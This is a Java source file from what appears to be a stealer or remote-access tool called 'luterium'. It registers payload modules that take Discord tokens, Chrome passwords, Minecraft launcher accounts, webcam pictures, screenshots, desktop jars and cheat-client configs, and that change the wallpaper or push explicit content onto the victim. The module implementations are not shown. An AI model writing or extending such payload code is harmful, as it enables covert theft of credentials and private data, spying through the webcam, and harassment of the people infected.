package dev.peter.luterium.payload;

import dev.peter.luterium.features.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

/**
 @author Peter
 @since 08/14/2022
 **/

public final class Payload {
    private static final Payload INSTANCE = new Payload();
    private final List<PayloadExecutor> payloads = new ArrayList<>(); //Payload list.

    private Payload() {
        payloads.addAll(Arrays.asList(
                new Info(),
                new PlaySong(),
                new FurryPorn(),
                new ScreenShot(),
                new ModsFolder(),
                new FdpConfigs(),
                new UsefulFiles(),
                new RiseConfigs(),
                new NixwareLogin(),
                new MCScreenshots(),
                new PlagueConfigs(),
                new WebcamPicture(),
                new DiscordTokens(),
                new ChromePassword(),
                new NixwareConfigs(),
                new JarsFromDesktop(),
                new ChangeWallpaper(),
                new EarthhackConfigs(),
                new LegendwareScripts(),
                new RusherhackConfigs(),
                new MCLauncherAccounts()
        ));
    }

    public static Optional<PayloadExecutor> getPayload(Class<? extends PayloadExecutor> klazz)
    {
        return getPayloads().stream().filter(p -> p.getClass().equals(klazz)).findAny();
    }
    public static List<PayloadExecutor> getPayloads()
    {
        return INSTANCE.payloads;
    }
}
